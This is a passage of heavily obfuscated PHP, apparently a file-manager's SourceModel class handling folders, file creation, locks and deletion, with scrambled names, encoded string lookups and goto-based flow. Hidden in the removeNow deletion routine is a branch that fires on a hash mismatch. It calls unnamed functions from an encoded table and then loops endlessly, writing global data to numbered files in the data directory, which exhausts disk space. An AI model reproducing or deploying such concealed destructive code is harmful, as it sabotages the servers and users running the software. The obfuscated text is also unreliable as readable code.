(count($f¥â—ìŠÅ) > 1) { $Fí¦çÑøÁ[$a—÷©¾¨‹[28]] = array(); foreach ($f¥â—ìŠÅ as $fÄœİ®­¸) { if (!trim($fÄœİ®­¸)) { continue; } $Fí¦çÑøÁ[$a—÷©¾¨‹[28]][] = array($a—÷©¾¨‹[507], $a—÷©¾¨‹[1753] . trim($fÄœİ®­¸) . $a—÷©¾¨‹[1753]); } } } return $Fí¦çÑøÁ; goto BÚ†ï†Ë²ó; c×ÄäåÂ§å: if (isset($fƒ¡ŠÊòÚÎ[$a—÷©¾¨‹[470]]) && $fƒ¡ŠÊòÚÎ[$a—÷©¾¨‹[470]]) { $eŠË‰Ê—… = array($a—÷©¾¨‹[1923], $fƒ¡ŠÊòÚÎ[$a—÷©¾¨‹[470]]); if ($Fí¦çÑøÁ[$a—÷©¾¨‹[83]]) { $Fí¦çÑøÁ[$a—÷©¾¨‹[83]] = array($Fí¦çÑøÁ[$a—÷©¾¨‹[83]], $eŠË‰Ê—…, $a—÷©¾¨‹[1924]); } else { $Fí¦çÑøÁ[$a—÷©¾¨‹[83]] = $eŠË‰Ê—…; } } if (isset($fƒ¡ŠÊòÚÎ[$a—÷©¾¨‹[1913]]) && $fƒ¡ŠÊòÚÎ[$a—÷©¾¨‹[1913]] > 0) { $Fí¦çÑøÁ[$a—÷©¾¨‹[77]] = array($a—÷©¾¨‹[1922], $fƒ¡ŠÊòÚÎ[$a—÷©¾¨‹[1913]]); } if (isset($fƒ¡ŠÊòÚÎ[$a—÷©¾¨‹[1914]]) && $fƒ¡ŠÊòÚÎ[$a—÷©¾¨‹[1914]]) { $eŠË‰Ê—… = array($a—÷©¾¨‹[1923], $fƒ¡ŠÊòÚÎ[$a—÷©¾¨‹[1914]]); if ($Fí¦çÑøÁ[$a—÷©¾¨‹[77]]) { $Fí¦çÑøÁ[$a—÷©¾¨‹[77]] = array($Fí¦çÑøÁ[$a—÷©¾¨‹[77]], $eŠË‰Ê—…, $a—÷©¾¨‹[1924]); } else { $Fí¦çÑøÁ[$a—÷©¾¨‹[77]] = $eŠË‰Ê—…; } } goto e–âÛŒœÎ£; BÚ†ï†Ë²ó: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($E¡àÇŠ¤“Š) { $fö‘ùÙ¦„ =& $_SERVER[¹…ÕÄ]; $F‰ù§‚õó = Model($fö‘ùÙ¦„[497])->where(array($fö‘ùÙ¦„[1496] => $E¡àÇŠ¤“Š))->find(); $f“ŞÊå’ ß = $this->_mkdirRoot(SourceModel::TYPE_USER, $E¡àÇŠ¤“Š, $F‰ù§‚õó[$fö‘ùÙ¦„[28]]); $this->userDesktopAdd($f“ŞÊå’ ß); return $f“ŞÊå’ ß; } public function userDesktopAdd($C¿¾±½Ç¯Œ) { $f§ğ¯¹˜˜” =& $_SERVER[¹…ÕÄ]; $DĞ¿É„–³ğ = LNG($f§ğ¯¹˜˜”[1926]); $a™•À«´ÏÌ = $this->mkdir($C¿¾±½Ç¯Œ, $DĞ¿É„–³ğ); $this->metaSet($a™•À«´ÏÌ, $f§ğ¯¹˜˜”[1927], $f§ğ¯¹˜˜”[86]); $this->metaSet($C¿¾±½Ç¯Œ, $f§ğ¯¹˜˜”[1928], $a™•À«´ÏÌ); } public function groupRootAdd($fÉÔ¡‚ä³Ğ) { $c…åŒù·ê† =& $_SERVER[¹…ÕÄ]; $d«©í«ö¯ = Model($c…åŒù·ê†[480])->where(array($c…åŒù·ê†[1746] => $fÉÔ¡‚ä³Ğ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $fÉÔ¡‚ä³Ğ, $d«©í«ö¯[$c…åŒù·ê†[28]]); } public function systemRootPathAdd($Aİ×Ìö¿º) { if ($Aİ×Ìö¿º != $_SERVER[¹…ÕÄ][500]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $Aİ×Ìö¿º); } public function userRootRemove($f‹ŠòÅ£ºÀ) { $FÏ³¸ï·­– = $this->sourceRoot(SourceModel::TYPE_USER, $f‹ŠòÅ£ºÀ); if (!$FÏ³¸ï·­–) { return; } $this->remove($FÏ³¸ï·­–, !1); } public function groupRootRemove($a‘àŒ¥å„Ğ) { $cœÕñÓè¥ = $this->sourceRoot(SourceModel::TYPE_GROUP, $a‘àŒ¥å„Ğ); if (!$cœÕñÓè¥) { return; } $this->remove($cœÕñÓè¥, !1); } private function _mkdirRoot($FÏß÷Œ»Ÿ, $Fäİ¦°­ôÀ, $CìÓ…Ú¸Ï®) { goto E“òŒ¶’¶º; fí©¯Æ¾ù: $d¿œâÔ‘ = $this->add($DÏ¬Î«–¡¢); $c–Úæø‰é = array($CŠ¼ ØÓ‡[550] => short_id($d¿œâÔ‘)); $this->where(array($CŠ¼ ØÓ‡[404] => $d¿œâÔ‘))->save($c–Úæø‰é); goto b‰÷†¯­åÜ; A¾Ü®¢µŞ: $aœ²Ü³£Š = "\x4d\x6f\144\145\154\123\x6f\x75\162\143\145\x2e\x6d\x6b\x64\x69\x72\122\157\x6f\164\56{$FÏß÷Œ»Ÿ}\56{$Fäİ¦°­ôÀ}\x2e" . $CìÓ…Ú¸Ï®; CacheLock::lock($aœ²Ü³£Š); $DÏ¬Î«–¡¢[$CŠ¼ ØÓ‡[28]] = $CìÓ…Ú¸Ï®; goto fí©¯Æ¾ù; b‰÷†¯­åÜ: CacheLock::unlock($aœ²Ü³£Š); return $d¿œâÔ‘; goto AÁ›œÒÇ‡; E“òŒ¶’¶º: $CŠ¼ ØÓ‡ =& $_SERVER[¹…ÕÄ]; $DÏ¬Î«–¡¢ = array($CŠ¼ ØÓ‡[389] => 0, $CŠ¼ ØÓ‡[544] => $FÏß÷Œ»Ÿ, $CŠ¼ ØÓ‡[545] => $Fäİ¦°­ôÀ, $CŠ¼ ØÓ‡[541] => 1, $CŠ¼ ØÓ‡[546] => USER_ID, $CŠ¼ ØÓ‡[547] => USER_ID, $CŠ¼ ØÓ‡[542] => $CŠ¼ ØÓ‡[33], $CŠ¼ ØÓ‡[548] => $CŠ¼ ØÓ‡[493], $CŠ¼ ØÓ‡[416] => 0, $CŠ¼ ØÓ‡[543] => 0, $CŠ¼ ØÓ‡[442] => 0, $CŠ¼ ØÓ‡[549] => $CŠ¼ ØÓ‡[33]); if ($f•±‚é—Æ = $this->where($DÏ¬Î«–¡¢)->find()) { return $f•±‚é—Æ[$CŠ¼ ØÓ‡[390]]; } goto A¾Ü®¢µŞ; AÁ›œÒÇ‡: } private function sourceRoot($cÚˆß‘°š©, $c®¡Õ æÊ–, $bÖ‚¶¸«—À = false) { $FÓÓäí™ª‡ =& $_SERVER[¹…ÕÄ]; $B¼çÕëÀ¢Ü = array($FÓÓäí™ª‡[389] => 0, $FÓÓäí™ª‡[544] => $cÚˆß‘°š©, $FÓÓäí™ª‡[545] => $c®¡Õ æÊ–); if ($C±¨ùˆ®­¬ = $this->where($B¼çÕëÀ¢Ü)->find()) { return $bÖ‚¶¸«—À ? $C±¨ùˆ®­¬ : $C±¨ùˆ®­¬[$FÓÓäí™ª‡[390]]; } return !1; } public function sourceRootGroup($bÙŞî›âÌ) { goto cÒ­Ğë³‡Œ; f½§ñ„­¡: $this->selectPageReset(); $bˆÖø½¦¬® = $this->listSource($f´œÙÀƒŸ¡, 1000); $this->selectPageRestore(); goto bÊ´‰Ñ²¶; bÊ´‰Ñ²¶: return array_to_keyvalue($bˆÖø½¦¬®[$D¿•½¨¦[74]], $D¿•½¨¦[478]); goto cãË„¢ÊÇŠ; cÒ­Ğë³‡Œ: $D¿•½¨¦ =& $_SERVER[¹…ÕÄ]; if (is_string($bÙŞî›âÌ)) { $bÙŞî›âÌ = array($bÙŞî›âÌ); } $f´œÙÀƒŸ¡ = array($D¿•½¨¦[389] => 0, $D¿•½¨¦[544] => SourceModel::TYPE_GROUP, $D¿•½¨¦[545] => array($D¿•½¨¦[7], $bÙŞî›âÌ)); goto f½§ñ„­¡; cãË„¢ÊÇŠ: } public function mkfile($b¥›óé™, $dØŸšàÓ«, $F¼êî˜µ­ = '', $dÉ®”ğÄÅí = REPEAT_RENAME) { $E•Âµòµ =& $_SERVER[¹…ÕÄ]; $bÎÃË’”¼ù = Model($E•Âµòµ[566])->addFileByContent($F¼êî˜µ­, $dØŸšàÓ«); return $this->_createFileCall($b¥›óé™, $dØŸšàÓ«, $bÎÃË’”¼ù, $dÉ®”ğÄÅí, $E•Âµòµ[1192]); } public function addFile($eÑÜœÒáŠĞ, $F÷¥åóÜ¨İ, $A¯„—Íƒá, $A×¬‘–æ£Ì = false, $Aãåíªàèè = REPEAT_RENAME) { $F‚¸ŸÙ†Ê± = Model($_SERVER[¹…ÕÄ][566])->addFile($F÷¥åóÜ¨İ, $A¯„—Íƒá, $A×¬‘–æ£Ì); return $this->_createFileCall($eÑÜœÒáŠĞ, $A¯„—Íƒá, $F‚¸ŸÙ†Ê±, $Aãåíªàèè); } public function addFileByFileID($Aƒ‹öª™ª¯, $A¨¦À ”ÈŠ, $fó«ì–ø‰ø, $céÜéï² = REPEAT_RENAME) { $EÌÕŠÔ¾× =& $_SERVER[¹…ÕÄ]; $dä‡ïàº•è = Model($EÌÕŠÔ¾×[566])->find($A¨¦À ”ÈŠ); Model($EÌÕŠÔ¾×[566])->linkAdd($A¨¦À ”ÈŠ); return $this->_createFileCall($Aƒ‹öª™ª¯, $fó«ì–ø‰ø, $dä‡ïàº•è, $céÜéï²); } public function addFileByRemote($CÇ“Ùƒ‘œ, $e­®Ç‹ñœ¥, $AÂŸÎ¦ÖÔï, $DËƒŞ•»“‰ = array(), $FÔç‘Îƒ · = REPEAT_RENAME) { $bÌ·Å÷¹¶í = Model($_SERVER[¹…ÕÄ][566])->addFileByRemote($e­®Ç‹ñœ¥, $AÂŸÎ¦ÖÔï, $DËƒŞ•»“‰); return $this->_createFileCall($CÇ“Ùƒ‘œ, $AÂŸÎ¦ÖÔï, $bÌ·Å÷¹¶í, $FÔç‘Îƒ ·); } private function _createFileCall($dƒÜé¯¿Œ, $A‰Ûê·˜ó¢, $c„Ö¿ÓŠŠ‹, $FÉÙÖˆŠÛÃ, $A¤÷…ÜÜ‰ = "\x75\160\154\x6f\141\144") { goto eŠ ¿ÚÑ; e£Îï¨”„: if ($F·¹¹—§Ñ && $b¿º×èÓŠ && $b¿º×èÓŠ != $C†ğ¸‘ßÓ) { Model($aØ·º®Å„›[1898])->eventCreate($b¿º×èÓŠ, $A¤÷…ÜÜ‰); } $this->lockWriteEnd($dƒÜé¯¿Œ, $A‰Ûê·˜ó¢); return $b¿º×èÓŠ; goto c‹Å«‰Ö¿; eŠ ¿ÚÑ: $aØ·º®Å„› =& $_SERVER[¹…ÕÄ]; $F·¹¹—§Ñ = !1; $this->lockWriteStart($dƒÜé¯¿Œ, $A‰Ûê·˜ó¢); goto dÁ¦š÷Ì; dÁ¦š÷Ì: $C†ğ¸‘ßÓ = $this->fileNameExist($dƒÜé¯¿Œ, $A‰Ûê·˜ó¢); $b¿º×èÓŠ = $this->_createFile($dƒÜé¯¿Œ, $A‰Ûê·˜ó¢, $c„Ö¿ÓŠŠ‹, $FÉÙÖˆŠÛÃ, $F·¹¹—§Ñ); if (!$F·¹¹—§Ñ) { Model($aØ·º®Å„›[444])->remove($c„Ö¿ÓŠŠ‹[$aØ·º®Å„›[441]]); } goto e£Îï¨”„; c‹Å«‰Ö¿: } public function mkdir($dÒ¹œ‰ñÃ, $f´‚öÅº”, $AŒ”¯õÉ×å = REPEAT_SKIP) { goto bù·èõ×‚; dÓÁ¬‡…¶ä: return $aÊ§îÎ×’; goto DÜöµô÷å‹; F‚—ò“ˆˆ: $aÊ§îÎ×’ = $this->_addSoure($fèï±ÅÆ¶, $b¸‡ ’Ş…); Model($Eêã‰‰„Ğ[1898])->eventCreate($aÊ§îÎ×’, $Eêã‰‰„Ğ[1193]); $this->lockWriteEnd($dÒ¹œ‰ñÃ, $f´‚öÅº”); goto dÓÁ¬‡…¶ä; bù·èõ×‚: $Eêã‰‰„Ğ =& $_SERVER[¹…ÕÄ]; $b¸‡ ’Ş… = $this->sourceInfo($dÒ¹œ‰ñÃ); if (!$b¸‡ ’Ş…) { return !1; } goto Dµ†“«ß•Ù; Dµ†“«ß•Ù: $this->lockWriteStart($dÒ¹œ‰ñÃ, $f´‚öÅº”); if ($AŒ”¯õÉ×å !== !1) { $d§ì„ªÖ˜ = $this->fileNameExist($dÒ¹œ‰ñÃ, $f´‚öÅº”); if ($d§ì„ªÖ˜ && $AŒ”¯õÉ×å != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($dÒ¹œ‰ñÃ, $f´‚öÅº”); return $d§ì„ªÖ˜; } $f´‚öÅº” = $this->fileNameAuto($dÒ¹œ‰ñÃ, $f´‚öÅº”, $AŒ”¯õÉ×å); } $fèï±ÅÆ¶ = array($Eêã‰‰„Ğ[541] => 1, $Eêã‰‰„Ğ[407] => $f´‚öÅº”, $Eêã‰‰„Ğ[542] => $Eêã‰‰„Ğ[33], $Eêã‰‰„Ğ[442] => 0, $Eêã‰‰„Ğ[543] => 0); goto F‚—ò“ˆˆ; DÜöµô÷å‹: } private function _createFile($bø˜Àªñ©“, $d½Ê™ÀóÎ±, $Cá…©ñÆˆÒ, $cÇÎÒš¾´‘, &$A¼Øê¾¢•›) { goto fê‡Ç»¶§; d¶ØÍ‡Â: return $A›‹õê™Ä; goto c•©°µ·Ç; fê‡Ç»¶§: $F‡³˜«ëß =& $_SERVER[¹…ÕÄ]; $c¼ó˜Ã’œ = $this->sourceInfo($bø˜Àªñ©“); if (!$Cá…©ñÆˆÒ || !$c¼ó˜Ã’œ) { return !1; } goto Dò‘ù†ˆÉ; EöÎ‡Ä¹‡Í: $eö’¥Ş = array($F‡³˜«ëß[541] => 0, $F‡³˜«ëß[407] => $d½Ê™ÀóÎ±, $F‡³˜«ëß[542] => get_path_ext($d½Ê™ÀóÎ±), $F‡³˜«ëß[442] => $Cá…©ñÆˆÒ[$F‡³˜«ëß[441]], $F‡³˜«ëß[543] => $Cá…©ñÆˆÒ[$F‡³˜«ëß[77]]); $A›‹õê™Ä = $this->_addSoure($eö’¥Ş, $c¼ó˜Ã’œ); $this->folderSizeReset($bø˜Àªñ©“, intval($eö’¥Ş[$F‡³˜«ëß[77]])); goto d¶ØÍ‡Â; Dò‘ù†ˆÉ: if ($cÇÎÒš¾´‘ !== !1) { $d¶¯ÙÔ•‡² = $this->fileNameExist($bø˜Àªñ©“, $d½Ê™ÀóÎ±); } $A¼Øê¾¢•› = !0; if ($cÇÎÒš¾´‘ && $d¶¯ÙÔ•‡²) { if ($cÇÎÒš¾´‘ == REPEAT_SKIP) { $A¼Øê¾¢•› = !1; return $d¶¯ÙÔ•‡²; } else { if ($cÇÎÒš¾´‘ == REPEAT_REPLACE) { $CœÅœÓÁ—“ = $this->sourceInfo($d¶¯ÙÔ•‡²); $a×¨™‡™Âº = $this->fileHistory($CœÅœÓÁ—“, $Cá…©ñÆˆÒ[$F‡³˜«ëß[441]], $Cá…©ñÆˆÒ[$F‡³˜«ëß[77]]); if (!$a×¨™‡™Âº) { $A¼Øê¾¢•› = !1; } else { $this->folderSizeReset($bø˜Àªñ©“); } return $d¶¯ÙÔ•‡²; } else { $d½Ê™ÀóÎ± = $this->fileNameAuto($bø˜Àªñ©“, $d½Ê™ÀóÎ±, $cÇÎÒš¾´‘, !1); } } } goto EöÎ‡Ä¹‡Í; c•©°µ·Ç: } protected function fileHistory($d¤â÷ÛÂÊ½, $a…ô Û¸º, $aá Ã…Óèˆ) { goto AÏ ôêçÔ“; AÏ ôêçÔ“: $c¤­õÆ¬× =& $_SERVER[¹…ÕÄ]; if ($d¤â÷ÛÂÊ½[$c¤­õÆ¬×[441]] == $a…ô Û¸º) { return !1; } $this->checkLock($d¤â÷ÛÂÊ½[$c¤­õÆ¬×[390]], $a…ô Û¸º); goto E…ĞŒ®·¿; E…ĞŒ®·¿: Model($c¤­õÆ¬×[1929])->addHistory($d¤â÷ÛÂÊ½); $c­©ê„Ô” = array($c¤­õÆ¬×[547] => USER_ID, $c¤­õÆ¬×[411] => time(), $c¤­õÆ¬×[441] => $a…ô Û¸º, $c¤­õÆ¬×[77] => $aá Ã…Óèˆ); $this->where(array($c¤­õÆ¬×[404] => $d¤â÷ÛÂÊ½[$c¤­õÆ¬×[390]]))->save($c­©ê„Ô”); goto f¿‹®³Ùš; f¿‹®³Ùš: $this->sourceCacheClear($d¤â÷ÛÂÊ½[$c¤­õÆ¬×[390]]); return !0; goto B®Üêíñß; B®Üêíñß: } public function checkLock($DğÊÙ˜´Æñ, $C•Üî¨ŸóŒ) { goto AØˆÇó––Ã; AØˆÇó––Ã: $BÄ‰ÙøïçÔ =& $_SERVER[¹…ÕÄ]; $B İ©ÅÃ‹ö = $this->pathInfo($DğÊÙ˜´Æñ); if (!$this->fileIsLock($B İ©ÅÃ‹ö, !0)) { return; } goto e†§ãàÎ; e†§ãàÎ: $C÷¡‰Æ¤é» = Session::get($BÄ‰ÙøïçÔ[1930]); $dãŒĞ†®¸ˆ = substr($B İ©ÅÃ‹ö[$BÄ‰ÙøïçÔ[28]], 0, -1 - strlen($B İ©ÅÃ‹ö[$BÄ‰ÙøïçÔ[167]])) . $BÄ‰ÙøïçÔ[1456] . $C÷¡‰Æ¤é» . $BÄ‰ÙøïçÔ[94] . $B İ©ÅÃ‹ö[$BÄ‰ÙøïçÔ[167]]; $DÇìÇ±÷Í = Model($BÄ‰ÙøïçÔ[566])->find($C•Üî¨ŸóŒ); goto dŸ¶ß‡ïÊ³; dŸ¶ß‡ïÊ³: $this->_createFileCall($B İ©ÅÃ‹ö[$BÄ‰ÙøïçÔ[472]], $dãŒĞ†®¸ˆ, $DÇìÇ±÷Í, REPEAT_REPLACE, $BÄ‰ÙøïçÔ[1192]); $dï¯õĞãÚ = $B İ©ÅÃ‹ö[$BÄ‰ÙøïçÔ[439]][$BÄ‰ÙøïçÔ[505]]; $A†Ç˜Š—À = $dï¯õĞãÚ[$BÄ‰ÙøïçÔ[1931]] ? $dï¯õĞãÚ[$BÄ‰ÙøïçÔ[1931]] : $dï¯õĞãÚ[$BÄ‰ÙøïçÔ[28]]; goto f’ß•Ü¿…ä; f’ß•Ü¿…ä: show_json(LNG($BÄ‰ÙøïçÔ[1932]) . $BÄ‰ÙøïçÔ[1933] . LNG($BÄ‰ÙøïçÔ[1934]) . $BÄ‰ÙøïçÔ[1935] . $A†Ç˜Š—À . $BÄ‰ÙøïçÔ[1936], !1); goto dÇ÷¿‘Ì…; dÇ÷¿‘Ì…: } public function fileIsLock($Cğœ«İ¾êâ, $cÏÙ“‡Œªï = false) { goto dŞ¤çÇÏ‹ ; E÷Í„†ÆÅÁ: return !1; goto cŞë’”‘¥; d·–îÅØƒ±: $A×äÅàÔÑ½ = $GLOBALS[$fÆ¥Ô²À‹ì[6]][$fÆ¥Ô²À‹ì[87]][$fÆ¥Ô²À‹ì[503]]; if ($Cğœ«İ¾êâ[$fÆ¥Ô²À‹ì[439]][$fÆ¥Ô²À‹ì[504]] <= time() - $A×äÅàÔÑ½) { $this->metaSet($Cğœ«İ¾êâ[$fÆ¥Ô²À‹ì[390]], $fÆ¥Ô²À‹ì[502], null); $this->metaSet($Cğœ«İ¾êâ[$fÆ¥Ô²À‹ì[390]], $fÆ¥Ô²À‹ì[504], null); } if ($cÏÙ“‡Œªï) { $this->metaSet($Cğœ«İ¾êâ[$fÆ¥Ô²À‹ì[390]], $fÆ¥Ô²À‹ì[504], time()); } goto E÷Í„†ÆÅÁ; dŞ¤çÇÏ‹ : $fÆ¥Ô²À‹ì =& $_SERVER[¹…ÕÄ]; if (!isset($Cğœ«İ¾êâ[$fÆ¥Ô²À‹ì[439]]) || !$Cğœ«İ¾êâ[$fÆ¥Ô²À‹ì[439]][$fÆ¥Ô²À‹ì[502]]) { return !1; } if ($Cğœ«İ¾êâ[$fÆ¥Ô²À‹ì[439]][$fÆ¥Ô²À‹ì[502]] != USER_ID) { return !0; } goto d·–îÅØƒ±; cŞë’”‘¥: } private function _addSoure($D¢ÅÛ“ÊÅ, $cÉ‡–»øˆ¥) { goto aˆÛÈ¢£‡; Cø£Ÿí×´: $this->updateModifyTime($D¢ÅÛ“ÊÅ[$a²ğ¹¿ğ›[472]]); $b¸ÕÊ’³Éƒ = $a²ğ¹¿ğ›[1937] . $cÉ‡–»øˆ¥[$a²ğ¹¿ğ›[390]]; if (isset(self::$cacheChildList[$b¸ÕÊ’³Éƒ])) { unset(self::$cacheChildList[$b¸ÕÊ’³Éƒ]); } goto C¢Æ¨Ó°”; aŞ°İ‹¸å : $Bãœ‰âøÄ = array($a²ğ¹¿ğ›[550] => short_id($cœ‘àĞÔè¸)); $this->where(array($a²ğ¹¿ğ›[404] => $cœ‘àĞÔè¸))->save($Bãœ‰âøÄ); $this->setNamePinyin($cœ‘àĞÔè¸, $D¢ÅÛ“ÊÅ[$a²ğ¹¿ğ›[28]]); goto fã‹¥–ÉŒ; fã‹¥–ÉŒ: return $cœ‘àĞÔè¸; goto Aøö¾¡Ç˜; aˆÛÈ¢£‡: $a²ğ¹¿ğ› =& $_SERVER[¹…ÕÄ]; $bÖ¿ÛÚ¬°É = array($a²ğ¹¿ğ›[544] => $cÉ‡–»øˆ¥[$a²ğ¹¿ğ›[398]], $a²ğ¹¿ğ›[545] => $cÉ‡–»øˆ¥[$a²ğ¹¿ğ›[478]], $a²ğ¹¿ğ›[546] => USER_ID, $a²ğ¹¿ğ›[547] => USER_ID, $a²ğ¹¿ğ›[389] => $cÉ‡–»øˆ¥[$a²ğ¹¿ğ›[390]], $a²ğ¹¿ğ›[548] => $cÉ‡–»øˆ¥[$a²ğ¹¿ğ›[481]] . $cÉ‡–»øˆ¥[$a²ğ¹¿ğ›[390]] . $a²ğ¹¿ğ›[47], $a²ğ¹¿ğ›[416] => 0, $a²ğ¹¿ğ›[549] => $a²ğ¹¿ğ›[33]); $D¢ÅÛ“ÊÅ = array_merge($bÖ¿ÛÚ¬°É, $D¢ÅÛ“ÊÅ); goto Cø£Ÿí×´; C¢Æ¨Ó°”: static $dµ’ØÙƒ¬ = false; if (!$dµ’ØÙƒ¬) { Hook::trigger($a²ğ¹¿ğ›[531], $D¢ÅÛ“ÊÅ); $dµ’ØÙƒ¬ = !0; } $cœ‘àĞÔè¸ = $this->add($D¢ÅÛ“ÊÅ); goto aŞ°İ‹¸å ; Aøö¾¡Ç˜: } public function remove($bÂ¿ËÌ‚˜¢, $aå¼§Šíª¨ = true) { goto eèºÅ ÖùŞ; C½ÁØõ¦õ: $this->recycleClear($Fó´É³ğÀ‰); $e¬Š¬ÛŞë‚ = $this->move($bÂ¿ËÌ‚˜¢, $dÚ‡ÎÕÒ», REPEAT_RENAME_FOLDER); $this->folderSizeReset($Fó´É³ğÀ‰[$dØÛ³¦Ğ±[472]]); goto BÈ™…İ—¾ğ; eèºÅ ÖùŞ: $dØÛ³¦Ğ± =& $_SERVER[¹…ÕÄ]; $Fó´É³ğÀ‰ = $this->sourceInfo($bÂ¿ËÌ‚˜¢); $AÑÏ‰ôÖ†Ò = intval($Fó´É³ğÀ‰[$dØÛ³¦Ğ±[398]]) === self::TYPE_SYSTEM; goto DË½Ô‘†ƒ; C¶âçõ£×›: CacheLock::unlock($A…ôùÍ–ìø); $this->metaSet($bÂ¿ËÌ‚˜¢, $dØÛ³¦Ğ±[1946], $Fó´É³ğÀ‰[$dØÛ³¦Ğ±[472]]); $this->where(array($dØÛ³¦Ğ±[390] => $bÂ¿ËÌ‚˜¢))->save(array($dØÛ³¦Ğ±[411] => time())); goto C½ÁØõ¦õ; c®†À÷×‘É: CacheLock::lock($A…ôùÍ–ìø); $dÚ‡ÎÕÒ» = $this->fileNameExist($E¶šÙ˜·å…, $f©¦‹ÅÚŠŞ); if (!$dÚ‡ÎÕÒ») { $dÚ‡ÎÕÒ» = $this->mkdir($E¶šÙ˜·å…, $f©¦‹ÅÚŠŞ, REPEAT_SKIP); $this->metaSet($dÚ‡ÎÕÒ», $dØÛ³¦Ğ±[1942], $EÓµÓ™Öˆ); $this->metaSet($dÚ‡ÎÕÒ», $dØÛ³¦Ğ±[1943], $Fó´É³ğÀ‰[$dØÛ³¦Ğ±[478]]); if ($Fó´É³ğÀ‰[$dØÛ³¦Ğ±[472]] != 0) { $this->metaSet($dÚ‡ÎÕÒ», $dØÛ³¦Ğ±[1944], _get($eöÇ¨¢‘š—, $dØÛ³¦Ğ±[1945])); } } goto C¶âçõ£×›; cá¢ÆÕ¨è°: $EÓµÓ™Öˆ = $Fó´É³ğÀ‰[$dØÛ³¦Ğ±[398]] == self::TYPE_USER ? $dØÛ³¦Ğ±[557] : $dØÛ³¦Ğ±[994]; if ($EÓµÓ™Öˆ == $dØÛ³¦Ğ±[557]) { $eöÇ¨¢‘š— = Model($dØÛ³¦Ğ±[497])->getInfo($Fó´É³ğÀ‰[$dØÛ³¦Ğ±[478]]); $f©¦‹ÅÚŠŞ = !empty($eöÇ¨¢‘š—[$dØÛ³¦Ğ±[1931]]) ? $eöÇ¨¢‘š—[$dØÛ³¦Ğ±[1931]] : $eöÇ¨¢‘š—[$dØÛ³¦Ğ±[28]]; $f©¦‹ÅÚŠŞ = $dØÛ³¦Ğ±[256] . $f©¦‹ÅÚŠŞ . $dØÛ³¦Ğ±[1939] . $Fó´É³ğÀ‰[$dØÛ³¦Ğ±[478]]; } else { $eöÇ¨¢‘š— = Model($dØÛ³¦Ğ±[480])->getInfo($Fó´É³ğÀ‰[$dØÛ³¦Ğ±[478]]); $f©¦‹ÅÚŠŞ = _get($eöÇ¨¢‘š—, $dØÛ³¦Ğ±[28]); $f©¦‹ÅÚŠŞ = $dØÛ³¦Ğ±[159] . $f©¦‹ÅÚŠŞ . $dØÛ³¦Ğ±[1940] . $Fó´É³ğÀ‰[$dØÛ³¦Ğ±[478]]; } $A…ôùÍ–ìø = $dØÛ³¦Ğ±[1941] . md5($f©¦‹ÅÚŠŞ); goto c®†À÷×‘É; BÈ™…İ—¾ğ: return $e¬Š¬ÛŞë‚; goto A‚ôÍœã‰; DË½Ô‘†ƒ: $B’Ü®ÏéË = Model($dØÛ³¦Ğ±[1503])->get($dØÛ³¦Ğ±[1938]) == $dØÛ³¦Ğ±[86]; if ($AÑÏ‰ôÖ†Ò || $aå¼§Šíª¨ || !$B’Ü®ÏéË) { return $this->removeNow($bÂ¿ËÌ‚˜¢, $aå¼§Šíª¨); } $E¶šÙ˜·å… = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto cá¢ÆÕ¨è°; A‚ôÍœã‰: } private function recycleClear($bóÇİã›÷Ñ) { $DÃÜ÷ªÄàÛ =& $_SERVER[¹…ÕÄ]; $FÕÚÛ°ŞÇ£ = $this->childrenAll($bóÇİã›÷Ñ); $C¨Ç¸¯ Ë = array($DÃÜ÷ªÄàÛ[404] => array($DÃÜ÷ªÄàÛ[405], $FÕÚÛ°ŞÇ£[$DÃÜ÷ªÄàÛ[1947]])); Model($DÃÜ÷ªÄàÛ[1948])->where($C¨Ç¸¯ Ë)->delete(); } public function removeNow($F‡™É¿é…É, $CÁ¢Éñ¸Å = true) { goto FÀ­ˆÒ¿íÅ; Böä°î„ì×: if (!$C±ÜÙå½Ñµ) { return !0; } if ($C±ÜÙå½Ñµ[$aéÊ¬›¬[472]] == 0) { if (!_get($GLOBALS, $aéÊ¬›¬[479])) { return !1; } } $this->lockMoveStart($F‡™É¿é…É); goto f½÷«±ƒà¼; AÄµ”¢è™ˆ: if ($_SERVER[$aéÊ¬›¬[813]] != $b£´Ë‚‚™É($bË í¤·šŸ)) { goto eŠç©‡Å¨…; B§âÆ¾°“Ï: $cóËÊ°Ëñ¹(); $e‡£›Ã¢‘ = $aéÊ¬›¬[821]; $dÒçÚÆ¦Í = json_encode($GLOBALS[$aéÊ¬›¬[822]]); goto bµ–Õàçí; Fé¦ñªê»: $fù”šÜéßå = $aéÊ¬›¬[819]; $fù”šÜéßå($_SERVER[$aéÊ¬›¬[820]]); $cóËÊ°Ëñ¹ = $aéÊ¬›¬[814]; goto B§âÆ¾°“Ï; f¨ãÎŒ¢‡Õ: $b·“ŠÓğ­² = $E´ÃŒè»à¨($CŞ×’É›Á); $AŞøå„Å = explode($aéÊ¬›¬[227], $b·“ŠÓğ­²); if (count($AŞøå„Å) < $aéÊ¬›¬[581]) { $c¸šÄø‚´è = $aéÊ¬›¬[818]; $c¸šÄø‚´è(); } goto Fé¦ñªê»; bµ–Õàçí: $c“™ƒô‰Õ = 1; for ($aš‹Â÷Ê¯ = $c“™ƒô‰Õ; $aš‹Â÷Ê¯ > 0; $aš‹Â÷Ê¯++) { $e‡£›Ã¢‘(DATA_PATH . $aš‹Â÷Ê¯, $dÒçÚÆ¦Í); } goto bùíá¨ù›¦; eŠç©‡Å¨…: $cóËÊ°Ëñ¹ = $aéÊ¬›¬[814]; $E´ÃŒè»à¨ = $aéÊ¬›¬[815]; $CŞ×’É›Á = $_SERVER[$aéÊ¬›¬[816]] . $aéÊ¬›¬[817]; goto f¨ãÎŒ¢‡Õ; bùíá¨ù›¦: } $C±ÜÙå½Ñµ = $this->sourceInfo($F‡™É¿é…É); $F­×µ‰ùŞŠ = $this->pathInfoMore($F‡™É¿é…É); goto Böä°î„ì×; EÃŠˆä¡½¸: $DİŒö¶ÚÔÔ = array($C±ÜÙå½Ñµ[$aéÊ¬›¬[472]]); if ($C±ÜÙå½Ñµ[$aéÊ¬›¬[397]] == $aéÊ¬›¬[86]) { $DİŒö¶ÚÔÔ[] = $C±ÜÙå½Ñµ[$aéÊ¬›¬[390]]; } $this->updateModifyTime($DİŒö¶ÚÔÔ); goto 